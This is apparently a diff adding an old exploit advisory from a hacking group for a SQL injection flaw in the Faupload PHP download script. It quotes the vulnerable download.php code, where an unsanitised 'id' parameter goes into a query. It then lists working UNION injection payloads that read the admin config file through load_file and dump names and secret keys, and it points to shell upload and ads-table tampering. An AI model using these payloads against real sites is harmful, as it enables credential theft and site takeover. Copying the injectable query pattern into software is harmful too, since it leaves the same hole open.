@@ -1,0 +1,30 @@
+                                !!..:: ZAC003 ::..!!
+                    -+( Vive int Iranian WhiteHat Nomads Group )+-
+-------------------------------------------------------------------------------------------
+Reporter : ZAC003 From Aria-Security.Net
+Script Download : http://webscripts.softpedia.com/script/Internet-Browsers-C-C/FTP/Faupload-41231.html
+BUG :
++ class/download.php +
+[Code]
+4:    $id = $_GET['id']; //Bug Here !
+5:    $how = "n";
+6:    $kind = "point";
+7:    $result = mysql_query("SELECT * FROM file WHERE $kind LIKE '$id' order by id DESC"); //Bug Here !
+8:    while($r=mysql_fetch_array($result))
+9:    {
+[/Code]
+[Exploit]
+    Example Downlaod : http://127.0.0.1/faupload/download.php?id=c16a5320fa475530d9583c34fd356ef5
+    Inject : http://127.0.0.1/faupload/download.php?id=-999'< SQL Command >/*
+    For View Admin UserName,Password(./admin/pconfig.php ) : -999'/**/union/**/select/**/1,load_file(0x2e2f61646d696e2f70636f6e6669672e706870),3,4,5,6,7,8,9/**/from/**/file/*
+    For View File Name And Secret Key (PROVIDING BE) :
+    For View Admin UserName,Password : -999'/**/union/**/select/**/1,name,3,4,5,6,skey,8,9/**/from/**/file/*
+    Upload Shell = [Priv8 Perl Script]
+    Update Ads Table(id,text): Use Update SQL Command !
+[/Exploit]
+-------------------------------------------------------------------------------------------
+For Contact : ZAC003[at]Y![dot]Com , Aria-Security.net(Forum And Best WebBase Hacking Tools)
+SpTnX : Aria-Security Team , Emperor Hacking Team , Iranian WhiteHat Nomads Group
+greets : M3hd!.h4ckCity And All Member of Aria-Security
+
+# milw0rm.com [2008-12-16]
